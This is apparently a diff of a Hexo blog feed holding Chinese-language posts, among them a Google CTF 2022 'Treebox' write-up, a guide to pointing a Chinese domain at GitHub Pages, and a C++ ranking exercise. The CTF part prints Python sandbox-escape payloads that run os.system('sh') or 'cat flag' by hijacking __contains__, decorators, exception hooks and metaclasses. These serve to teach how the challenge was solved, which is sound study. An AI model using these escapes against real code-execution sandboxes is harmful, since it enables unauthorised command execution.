+abspath = os.path.abspath(__file__)
+dname = os.path.dirname(abspath)
+os.chdir(dname)
+
+print(&quot;-- Please enter code (last line must contain only --END)&quot;)
+source_code = &quot;&quot;
+while True:
+  line = sys.stdin.readline()
+  if line.startswith(&quot;--END&quot;):
+    break
+  source_code += line
+
+tree = compile(source_code, &quot;input.py&quot;, &#39;exec&#39;, flags=ast.PyCF_ONLY_AST)
+if verify_secure(tree):  # Safe to execute!
+  print(&quot;-- Executing safe code:&quot;)
+  compiled = compile(source_code, &quot;input.py&quot;, &#39;exec&#39;)
+  exec(compiled)
+</code></pre>
+</div>
+</details>
+
+<p>阅读源码,可以发现:</p>
+<ul>
+<li><code>flag</code>在当前工作目录下一个名为<code>flag</code>的文件</li>
+<li>我们可以通过<code>exec</code>执行任意代码,但必须通过<code>verify_secure</code>函数的检查</li>
+<li><code>verify_secure</code>使用<code>ast</code>模块进行分析,不能有显式的函数调用和导入语句</li>
+<li><code>os</code>和<code>sys</code>模块可用</li>
+</ul>
+<p>思路:</p>
+<ul>
+<li><code>os</code>模块已经导入,我们可以通过<code>os.system()</code>方法来执行系统命令</li>
+<li>借助于Python机制,通过非显式的方式地来调用函数,如内置函数、重载运算符、解释器Hook</li>
+</ul>
+<p>我的解法:</p>
+<p>在python中使用<code>in</code>运算符时,默认会调用<code>__contains__</code>方法,并且会将需要判断的对象作为形参传入;</p>
+<p>所以我们可以用<code>os.system</code>覆盖现有的python对象&#x2F;类上的<code>__contains__</code>方法,然后通过运算符来调用<code>system</code>函数.</p>
+<pre><code class="python">os.environ.__class__.__contains__ = os.system
+&#39;cat flag&#39; in os.environ
+</code></pre>
+<p>其他解法:</p>
+<ol>
+<li><p>装饰器</p>
+<pre><code class="python">@exec
+@input
+class X:
+  pass
+</code></pre>
+</li>
+<li><p>异常</p>
+<pre><code class="python">class MyException(Exception):
+  def __str__(self):
+    return &#39;cat flag&#39;
+
+sys.stdout.write=os.system
+sys.stderr.write=os.system
+
+raise MyException   
+</code></pre>
+<pre><code class="python">class X:
+    def __init__(self, a, b, c):
+        self += &quot;os.system(&#39;sh&#39;)&quot;
+    __iadd__ = exec
+sys.excepthook = X
+1/0
+</code></pre>
+</li>
+<li><p>元类</p>
+<pre><code class="python"># This will define the members on the &quot;sub&quot;class
+class Metaclass:
+    __getitem__ = exec # So Sub[string] will execute exec(string)
+# Note: Metaclass.__class__ == type
+    
+class Sub(metaclass=Metaclass): # That&#39;s how we make Sub.__class__ == Metaclass
+    pass # Nothing special to do
+
+assert isinstance(Sub, Metaclass)
+sub[&#39;import os; os.system(&quot;sh&quot;)&#39;]
+</code></pre>
+</li>
+</ol>
+<p>其他Writeup</p>
+<ul>
+<li><a href="https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/">GCTF 2022 Treebox</a></li>
+</ul>
+<p><strong>flag:</strong><code>CTF&#123;CzeresniaTopolaForsycja&#125;</code></p>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
       <categories>
-        <category>Hexo</category>
+        <category>CTF</category>
+        <category>GoogleCTF</category>
       </categories>
       <tags>
-        <tag>Hexo</tag>
-        <tag>Github</tag>
+        <tag>CTF</tag>
+        <tag>GoogleCTF</tag>
       </tags>
   </entry>
   <entry>
@@ -1986,6 +1953,90 @@ conn.interactive()
       <tags>
         <tag>CTF</tag>
         <tag>K3RN3LCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hexo+Github pages博客绑定中文域名</title>
+    <url>/posts/24787/</url>
+    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>近期又开始了hexo的折腾，在阿里云上买了一个属于自己的域名，因此想着把自己用hexo+Github搭建的博客通过域名访问，于是按照百度上的教程一步一步来绑定域名，结果出现了很多问题 。整个过程可谓一波三折，终于实现了通过域名来访问博客，下面简要介绍一下我绑定域名过程中遇到的问题以及解决方案。</p>
+<span id="more"></span>
+<h2 id="购买域名"><a href="#购买域名" class="headerlink" title="购买域名"></a>购买域名</h2><p>这里以在<a href="https://www.aliyun.com/">阿里云</a>上购买域名为例,大家也可以去其他平台购买域名。<br>登录阿里云，点击<strong>产品</strong>，选择<strong>域名注册</strong>。<br>注册域名前需查询域名是否已被注册，选择自己喜欢的域名，支付即可。<br><img data-src="/images/20180213014855.jpg"><br>一般来说，.top与.xyz结尾的域名都比较便宜。为了节约成本，我买的.top结尾的域名，一年只需两块钱，很便宜。</p>
+<h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>购买域名后，我们依次点击个人昵称-&gt;域名与网站(万网)-&gt;域名，进入管理控制台，在这里我们可以看到自己购买的域名,点击<strong>解析</strong>，进入解析设置。<br><img data-src="/images/20180212235815.jpg"><br>点击添加解析，依次输入：<strong>CNAME、@、Github博客地址</strong>，点击<strong>确定</strong>，完成个人域名向个人博客的映射。<br><img data-src="/images/20180212230359.jpg"></p>
+<div class="note warning"><p>注意：这里填入博客地址的时候无需填写https:// ，只需按照example.github.io格式填写就行了。
+</p></div>
+
+<h2 id="创建CNAME文件"><a href="#创建CNAME文件" class="headerlink" title="创建CNAME文件"></a>创建CNAME文件</h2><p>在本地的根目录下的source文件夹中新建一个名为<strong>CNAME</strong>的文本文件，文件内容为<strong>个人域名</strong>（没有http:&#x2F;&#x2F; ,也没有www.）,然后重命名删除该文件的后缀名:<strong>.txt</strong>。<br>使用<code>hexo d -g</code>命令部署博客，这时在浏览器中输入新注册的域名，已经可以正常的访问博客了。</p>
+<h3 id="英文域名"><a href="#英文域名" class="headerlink" title="英文域名"></a>英文域名</h3><p>英文域名就直接写:<code>example.con</code></p>
+<h3 id="中文域名"><a href="#中文域名" class="headerlink" title="中文域名"></a>中文域名</h3><p>中文域名的话,则需先将中文域名转换为<strong>Punycode标准编码的字符串</strong>:<a href="http://www.dh.vg/tools/zm.php">中文域名转换Punycode标准编码工具</a><br>For example:<br><code>例子.中文</code>经过转换为<code>xn--fsqu00a.xn--fiq228c</code><br>将<code>xn--****.xn--***</code>填入<strong>CNAME</strong>文件即可。</p>
+<div class="note danger"><p>如果直接在CNAME文件中填写中文域名,则Github会通过邮件提醒你:
+The CNAME xxx.com is not properly formatted. See https://help.github.com/articles/troubleshooting-custom-domains/#github-repository-setup-errors for more information.
+</p></div>
+## LeanCloud数据丢失
+通过域名访问博客，发现文章的阅读次数不显示，于是各种折腾：检查元素、谷歌，最后发现是由于没有将新注册的域名加入到LeanCloud设置中的**Web 安全域名**,导致无法调用服务器资源。
+解决方案：访问：[LeanCloud官网](https://leancloud.cn),进入**控制台**，在设置中点击**安全中心**，将新注册的域名加入到**Web安全域名**中，点击**保存**即可。
+![](/images/20180213013700.jpg)
+
+<h2 id="busuanzi数据丢失"><a href="#busuanzi数据丢失" class="headerlink" title="busuanzi数据丢失"></a>busuanzi数据丢失</h2><p>无论是通过域名还是github地址访问博客，博客底部的统计浏览量与浏览人次均不是以前的数据，而是从头开始计算....<br>busuanzi还不具备统初始值的功能，只能从头开始计算了。。。</p>
+<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><h3 id="中文域名-1"><a href="#中文域名-1" class="headerlink" title="中文域名"></a>中文域名</h3><p>１、一类是域名后缀为英文字母的国际中文域名和别国中文域名，比如：中文.com，中文.net，中文.biz，中文.cc，中文.hk，中文.tm，中文.tv，中文.tw；<br>２、一类是域名后缀为中文的纯中文国内中文域名，比如：中文域名.中国，中文域名.公司，中文域名.网络；<br>中文域名在解析的时候，需要先转换为 xn--fiq228c.com或xn--fiq228c.cn形式的ASCII码，这种编码称为PunyCode。纯中文域名不被标准的解析服务器支持，要实现对这种纯中文域名的正确访问，ISP需要做相应的修改，以便能够正确解析中文域名。同时CNNIC也提供了专用服务器，用户只要将浏览器的DNS设置指向这台服务器，它同样可以完成对纯中文域名的正确解析。另外，考虑到现在有些ISP还没有做修改，而有些用户又不方便将DNS设置指向CNNIC提供的服务器，纯中文域名会被加上.cn后缀，即对每一个纯中文域名同时有两种形式：纯中文域名和纯中文域名.CN， 如：&quot;中文域名.网络&quot;和&quot;中文域名.网络.CN&quot;。这样即使ISP还没有做相应的修改，用户也可以正确使用中文域名。</p>
+<h3 id="PunyCode"><a href="#PunyCode" class="headerlink" title="PunyCode"></a>PunyCode</h3><p>英文域名在IIS或Apache中的虚拟主机设置，可以直接使用英文域名，如webmasterhome.cn。<br>中文域名在IIS或Apache中应如何设置主机头呢？如&quot;中国站长之家.com&quot;。<br>1、在进行设置之前要先把中文域名转化成为PunyCode编码，然后在主机头设置里面填上中文域名所对应的PunyCode编码(｀xn--fiqsC146Ah4ex80Cro7A.com｀)便可。<br>新的国际化域名的标准在网域名称编码上，为了保留向下兼容性及不影响现有的应用程序协议，因此将多国语言域名转成ASCII编码，而这种编码称为『punycode』。<br>因为经过Nameprep处理过的国际化域名是以 Unicode 序列的形式表示的。但现有的 DNS系统只支持用 ASCII字符表示的域名，所以要对Unicode序列进行 ACE(ASCII-compatible encoding)编码，把 Unicode序列表示的域名转换成 ASCII 字符串表示的ACE域名。<br>2、PunyCode是一种专为国际化域名而设计的高效ACE编码方式。它可以在Unicode序列和ASCII 字符串之间进行唯一的和可逆的转换。转换的过程中，Unicode 序列中的ASCII字符保持不变，国际化字符则用字母和数字来表示。它的实质是一种用数量有限的基本字符(字母和数字)来唯一地表示大字符集(Unicode)中的字符的通用算法。域名中的字符，包括 ASCII 码和 Unicode 码，都是作为整数进行处理。<br>PunyCode则是将一个经过Nameprep处理过的IDN，从一个8位的编码的形式转换为7位编码的形式。目前Internet DNS一向是7位ASCII编码的环境，经过这个PunyCode转码程序，便将IDN从一个8位的IDN转换为与现有DNS环境兼容的编码。<br>3、在DNS服务器方面，需要将IDN以PunyCode的编码形式来设定。因为PunyCode本身就是一种7位的编码，与ASCII编码完全兼容，所以可适用设定于目前所有可用的DNS版本,也就是说可以不需要为了设定PunyCode而重新安装BIND新版本。但是若是需要使用DNAME指令来设定资源记录(Resource Record)，则需先提升为BIND9的版本。</p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>Hexo</category>
+      </categories>
+      <tags>
+        <tag>Hexo</tag>
+        <tag>Github</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>L2-3.名人堂与代金券</title>
+    <url>/posts/45393/</url>
+    <content><![CDATA[<h2 id="题目内容"><a href="#题目内容" class="headerlink" title="题目内容"></a>题目内容</h2><p>对于在中国大学MOOC(<a href="http://www.icourse163.org/">http://www.icourse163.org/</a>) 学习“数据结构”课程的学生，想要获得一张合格证书，总评成绩必须达到 60 分及以上，并且有另加福利：总评分在 [G, 100] 区间内者，可以得到 50 元 PAT 代金券；在 [60, G) 区间内者，可以得到 20 元PAT代金券。全国考点通用，一年有效。同时任课老师还会把总评成绩前 K 名的学生列入课程“名人堂”。本题就请你编写程序，帮助老师列出名人堂的学生，并统计一共发出了面值多少元的 PAT 代金券。</p>
+<span id="more"></span>
+<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>输入在第一行给出 3 个整数，分别是 N（不超过 10 000 的正整数，为学生总数）、G（在 (60,100) 区间内的整数，为题面中描述的代金券等级分界线）、K（不超过 100 且不超过 N 的正整数，为进入名人堂的最低名次）。接下来 N 行，每行给出一位学生的账号（长度不超过15位、不带空格的字符串）和总评成绩（区间 [0, 100] 内的整数），其间以空格分隔。题目保证没有重复的账号。 </p>
+<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>首先在一行中输出发出的 PAT 代金券的总面值。然后按总评成绩非升序输出进入名人堂的学生的名次、账号和成绩，其间以 1 个空格分隔。需要注意的是：成绩相同的学生享有并列的排名，排名并列时，按账号的字母序升序输出。</p>
+<h2 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例"></a>输入样例</h2><div class="note default no-icon"><p>
+10 80 5
+cy@zju.edu.cn 78
+cy@pat-edu.com 87
+1001@qq.com 65
+uh-oh@163.com 96
+test@126.com 39
+anyone@qq.com 87
+zoe@mit.edu 80
+jack@ucla.edu 88
+bob@cmu.edu 80
+ken@163.com 70
+</p></div>
+
+<h2 id="输出样例"><a href="#输出样例" class="headerlink" title="输出样例"></a>输出样例</h2><div class="note default no-icon"><p>
+360
+1 uh-oh@163.com 96
+2 jack@ucla.edu 88
+3 anyone@qq.com 87
+3 cy@pat-edu.com 87
+5 bob@cmu.edu 80
+5 zoe@mit.edu 80
+</p></div>
+
+<p><strong>时间限制：150ms内存限制：65536kb</strong></p>
+<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>用一个结构体来存姓名和成绩，再用自定义的比较函数sort一下。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">stu</span></span><br><span class="line">&#123;</span><br><span class="line">    string name;</span><br><span class="line">    <span class="type">int</span> grade;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(<span class="type">const</span> stu&amp; s1, <span class="type">const</span> stu&amp; s2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s1.grade != s2.grade)</span><br><span class="line">        <span class="keyword">return</span> s1.grade &gt; s2.grade;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> s1.name &lt; s2.name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;in.txt&quot;, &quot;r&quot;, stdin);</span></span><br><span class="line">    <span class="comment">//freopen(&quot;out.txt&quot;, &quot;w&quot;, stdout);</span></span><br><span class="line">    cin.<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    <span class="type">int</span> n, g, k;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; g &gt;&gt; k;</span><br><span class="line">    vector&lt;stu&gt; v;</span><br><span class="line">    ll ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        string temp1;</span><br><span class="line">        <span class="type">int</span> temp2;</span><br><span class="line">        cin &gt;&gt; temp1 &gt;&gt; temp2;</span><br><span class="line">        stu temp;</span><br><span class="line">        temp.name = temp1;</span><br><span class="line">        temp.grade = temp2;</span><br><span class="line">        v.<span class="built_in">push_back</span>(temp);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(temp2 &gt;= <span class="number">60</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(temp2 &lt; g)</span><br><span class="line">                ans += <span class="number">20</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                ans += <span class="number">50</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> index = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> number = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">sort</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), cmp);</span><br><span class="line">    vector&lt;stu&gt;::iterator t;</span><br><span class="line">    ll flag = v[<span class="number">0</span>].grade;</span><br><span class="line">    <span class="keyword">for</span>(t = v.<span class="built_in">begin</span>(); t != v.<span class="built_in">end</span>(); t++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(flag != (*t).grade)</span><br><span class="line">        &#123;</span><br><span class="line">            flag = (*t).grade;</span><br><span class="line">            index = number;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(index &gt; k)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        cout &lt;&lt; index &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; (*t).name &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; (*t).grade &lt;&lt; endl;</span><br><span class="line">        number++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>用一个map&lt;string,name&gt;来存name和grade,将map转存到vcetor到中进行排序。<br>比赛的时候好蠢好蠢的做法，后面会说。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span> <span class="params">(<span class="type">const</span> pair&lt;string,<span class="type">int</span>&gt;&amp; a,<span class="type">const</span> pair&lt;string,<span class="type">int</span>&gt;&amp; b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a.second!=b.second)</span><br><span class="line">        <span class="keyword">return</span> a.second&gt;b.second;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> a.first&lt;b.first;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;in.txt&quot;, &quot;r&quot;, stdin);</span></span><br><span class="line">    <span class="comment">//freopen(&quot;out.txt&quot;, &quot;w&quot;, stdout);</span></span><br><span class="line">    cin.<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    <span class="type">int</span> n,g,k;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;g&gt;&gt;k;</span><br><span class="line">    map&lt;string,<span class="type">int</span>&gt; m;</span><br><span class="line">    ll ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        string temp1;</span><br><span class="line">        <span class="type">int</span> temp2;</span><br><span class="line">        cin&gt;&gt;temp1&gt;&gt;temp2;</span><br><span class="line">        m.<span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;string,<span class="type">int</span>&gt;(temp1,temp2));</span><br><span class="line">        <span class="keyword">if</span>(temp2&gt;=<span class="number">60</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(temp2&lt;g)</span><br><span class="line">                ans+=<span class="number">20</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                ans+=<span class="number">50</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    vector&lt;pair&lt;string,<span class="type">int</span>&gt;&gt; <span class="built_in">mm</span>(m.<span class="built_in">begin</span>(),m.<span class="built_in">end</span>());<span class="comment">//map转存至vector</span></span><br><span class="line">    <span class="built_in">sort</span>(mm.<span class="built_in">begin</span>(),mm.<span class="built_in">end</span>(),cmp);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> index=<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> number=<span class="number">1</span>;</span><br><span class="line">    vector&lt;pair&lt;string,<span class="type">int</span>&gt;&gt;::iterator t=mm.<span class="built_in">begin</span>();</span><br><span class="line">    ll flag=(*t).second;</span><br><span class="line">    <span class="keyword">for</span>(t=mm.<span class="built_in">begin</span>();t!=mm.<span class="built_in">end</span>();t++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(flag!=(*t).second)</span><br><span class="line">        &#123;</span><br><span class="line">            flag=(*t).second;</span><br><span class="line">            index=number;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(index&gt;k)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        cout&lt;&lt;index&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;(*t).first&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;(*t).second&lt;&lt;endl;</span><br><span class="line">        number++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>比赛的时候没看清题意，上来就直接一个map，快写完了的时候才发现不对，然后就突发奇想的对map进行sort，但是编译的时候比较函数那一行一直报错。我到现在都不清楚为什么比赛的时候要一直死磕对map按照value进行sort，就是懒得改成结构体加vector，结果直到比赛结束前几分钟才开始改，虽然改完了可惜没时间交了。<br>回到宿舍终于在网上找到了对map进行sort的方法：将map转存至vector中，然后sort。<code>vector&lt;pair&lt;string,int&gt;&gt; mm(m.begin(),m.end());</code>但是还是用结构体加vector方便啊。<br>还是自己菜啊.......</p>
+<div class="note warning"><p>
+注意：STL库中的sort函数只能对线性存储的对象进行排序,如:vector、array、list、deque,不能对集合容器进行排序,如:set、map;
+</p></div>
+
+<p>参考博客:<a href="https://blog.csdn.net/iicy266/article/details/11906189">C++ STL中Map的按Key排序和按Value排序</a></p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>ACM</category>
+      </categories>
+      <tags>
+        <tag>ACM</tag>
+        <tag>CCCC天梯赛</tag>
       </tags>
   </entry>
   <entry>
@@ -2277,57 +2328,6 @@ if(isset($_POST[&quot;notewrite&quot;])) &#123;
       <tags>
         <tag>CTF</tag>
         <tag>KillerQueenCTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>L2-3.名人堂与代金券</title>
-    <url>/posts/45393/</url>
-    <content><![CDATA[<h2 id="题目内容"><a href="#题目内容" class="headerlink" title="题目内容"></a>题目内容</h2><p>对于在中国大学MOOC(<a href="http://www.icourse163.org/">http://www.icourse163.org/</a>) 学习“数据结构”课程的学生，想要获得一张合格证书，总评成绩必须达到 60 分及以上，并且有另加福利：总评分在 [G, 100] 区间内者，可以得到 50 元 PAT 代金券；在 [60, G) 区间内者，可以得到 20 元PAT代金券。全国考点通用，一年有效。同时任课老师还会把总评成绩前 K 名的学生列入课程“名人堂”。本题就请你编写程序，帮助老师列出名人堂的学生，并统计一共发出了面值多少元的 PAT 代金券。</p>
-<span id="more"></span>
-<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>输入在第一行给出 3 个整数，分别是 N（不超过 10 000 的正整数，为学生总数）、G（在 (60,100) 区间内的整数，为题面中描述的代金券等级分界线）、K（不超过 100 且不超过 N 的正整数，为进入名人堂的最低名次）。接下来 N 行，每行给出一位学生的账号（长度不超过15位、不带空格的字符串）和总评成绩（区间 [0, 100] 内的整数），其间以空格分隔。题目保证没有重复的账号。 </p>
-<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>首先在一行中输出发出的 PAT 代金券的总面值。然后按总评成绩非升序输出进入名人堂的学生的名次、账号和成绩，其间以 1 个空格分隔。需要注意的是：成绩相同的学生享有并列的排名，排名并列时，按账号的字母序升序输出。</p>
-<h2 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例"></a>输入样例</h2><div class="note default no-icon"><p>
-10 80 5
-cy@zju.edu.cn 78
-cy@pat-edu.com 87
-1001@qq.com 65
-uh-oh@163.com 96
-test@126.com 39
-anyone@qq.com 87
-zoe@mit.edu 80
-jack@ucla.edu 88
-bob@cmu.edu 80
-ken@163.com 70
-</p></div>
-
-<h2 id="输出样例"><a href="#输出样例" class="headerlink" title="输出样例"></a>输出样例</h2><div class="note default no-icon"><p>
-360
-1 uh-oh@163.com 96
-2 jack@ucla.edu 88
-3 anyone@qq.com 87
-3 cy@pat-edu.com 87
-5 bob@cmu.edu 80
-5 zoe@mit.edu 80
-</p></div>
-
-<p><strong>时间限制：150ms内存限制：65536kb</strong></p>
-<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>用一个结构体来存姓名和成绩，再用自定义的比较函数sort一下。</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">stu</span></span><br><span class="line">&#123;</span><br><span class="line">    string name;</span><br><span class="line">    <span class="type">int</span> grade;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(<span class="type">const</span> stu&amp; s1, <span class="type">const</span> stu&amp; s2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s1.grade != s2.grade)</span><br><span class="line">        <span class="keyword">return</span> s1.grade &gt; s2.grade;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> s1.name &lt; s2.name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;in.txt&quot;, &quot;r&quot;, stdin);</span></span><br><span class="line">    <span class="comment">//freopen(&quot;out.txt&quot;, &quot;w&quot;, stdout);</span></span><br><span class="line">    cin.<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    <span class="type">int</span> n, g, k;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; g &gt;&gt; k;</span><br><span class="line">    vector&lt;stu&gt; v;</span><br><span class="line">    ll ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        string temp1;</span><br><span class="line">        <span class="type">int</span> temp2;</span><br><span class="line">        cin &gt;&gt; temp1 &gt;&gt; temp2;</span><br><span class="line">        stu temp;</span><br><span class="line">        temp.name = temp1;</span><br><span class="line">        temp.grade = temp2;</span><br><span class="line">        v.<span class="built_in">push_back</span>(temp);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(temp2 &gt;= <span class="number">60</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(temp2 &lt; g)</span><br><span class="line">                ans += <span class="number">20</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                ans += <span class="number">50</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> index = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> number = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">sort</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), cmp);</span><br><span class="line">    vector&lt;stu&gt;::iterator t;</span><br><span class="line">    ll flag = v[<span class="number">0</span>].grade;</span><br><span class="line">    <span class="keyword">for</span>(t = v.<span class="built_in">begin</span>(); t != v.<span class="built_in">end</span>(); t++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(flag != (*t).grade)</span><br><span class="line">        &#123;</span><br><span class="line">            flag = (*t).grade;</span><br><span class="line">            index = number;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(index &gt; k)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        cout &lt;&lt; index &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; (*t).name &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; (*t).grade &lt;&lt; endl;</span><br><span class="line">        number++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>用一个map&lt;string,name&gt;来存name和grade,将map转存到vcetor到中进行排序。<br>比赛的时候好蠢好蠢的做法，后面会说。</p>
